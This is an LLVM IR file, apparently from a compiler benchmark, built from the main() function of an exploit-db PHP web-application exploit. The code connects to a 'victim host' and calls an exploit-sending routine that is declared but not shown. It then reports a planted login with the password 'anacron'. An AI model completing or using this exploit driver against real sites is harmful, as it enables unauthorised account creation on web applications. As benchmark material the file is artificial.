; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_866.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_866.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.hostent = type { i32, i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.1 = private unnamed_addr constant [38 x i8] c"[*] Creating socket             [OK]\0A\00", align 1
@.str.2 = private unnamed_addr constant [38 x i8] c"[*] Resolving victim host       [OK]\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [38 x i8] c"[*] Connecting at victim host   [OK]\0A\00", align 1
@.str.4 = private unnamed_addr constant [85 x i8] c"[*] Now check on\0A    http://%s%s\0A\0A    your username: %s\0A    with password: anacron\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i32, i32* %4, align 4
  %11 = icmp ne i32 %10, 4
  br i1 %11, label %12, label %14

12:                                               ; preds = %2
  %13 = call i32 (...) @info()
  br label %14

14:                                               ; preds = %12, %2
  %15 = load i32, i32* @AF_INET, align 4
  %16 = load i32, i32* @SOCK_STREAM, align 4
  %17 = call i32 @socket(i32 %15, i32 %16, i32 0)
  store i32 %17, i32* %6, align 4
  %18 = icmp slt i32 %17, 0
  br i1 %18, label %19, label %21

19:                                               ; preds = %14
  %20 = call i32 (...) @errsock()
  br label %21

21:                                               ; preds = %19, %14
  %22 = call i32 @system(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0))
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call %struct.hostent* @gethostbyname(i8* %26)
  store %struct.hostent* %27, %struct.hostent** %9, align 8
  %28 = icmp eq %struct.hostent* %27, null
  br i1 %28, label %29, label %31

29:                                               ; preds = %21
  %30 = call i32 (...) @errgeth()
  br label %31

31:                                               ; preds = %29, %21
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  %33 = call i32 @memset(%struct.sockaddr_in* %8, i32 0, i32 12)
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %35 = bitcast i32* %34 to i8*
  %36 = load %struct.hostent*, %struct.hostent** %9, align 8
  %37 = getelementptr inbounds %struct.hostent, %struct.hostent* %36, i32 0, i32 1
  %38 = load i32, i32* %37, align 4
  %39 = load %struct.hostent*, %struct.hostent** %9, align 8
  %40 = getelementptr inbounds %struct.hostent, %struct.hostent* %39, i32 0, i32 0
  %41 = load i32, i32* %40, align 4
  %42 = call i32 @memcpy(i8* %35, i32 %38, i32 %41)
  %43 = load i32, i32* @AF_INET, align 4
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %43, i32* %44, align 4
  %45 = load i32, i32* @PORT, align 4
  %46 = call i32 @htons(i32 %45)
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i32 %46, i32* %47, align 4
  %48 = load i32, i32* %6, align 4
  %49 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 12)
  store i32 %50, i32* %7, align 4
  %51 = load i32, i32* %7, align 4
  %52 = icmp slt i32 %51, 0
  br i1 %52, label %53, label %55

53:                                               ; preds = %31
  %54 = call i32 (...) @errsock()
  br label %55

55:                                               ; preds = %53, %31
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.3, i64 0, i64 0))
  %57 = load i32, i32* %6, align 4
  %58 = load i8**, i8*** %5, align 8
  %59 = call i32 @sendxpl(i32 %57, i8** %58)
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 1
  %62 = load i8*, i8** %61, align 8
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 2
  %65 = load i8*, i8** %64, align 8
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 3
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.4, i64 0, i64 0), i8* %62, i8* %65, i8* %68)
  %70 = load i32, i32* %6, align 4
  %71 = call i32 @shutdown(i32 %70, i32 2)
  %72 = load i32, i32* %6, align 4
  %73 = call i32 @close(i32 %72)
  ret i32 0
}

declare dso_local i32 @info(...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @errsock(...) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @errgeth(...) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sendxpl(i32, i8**) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
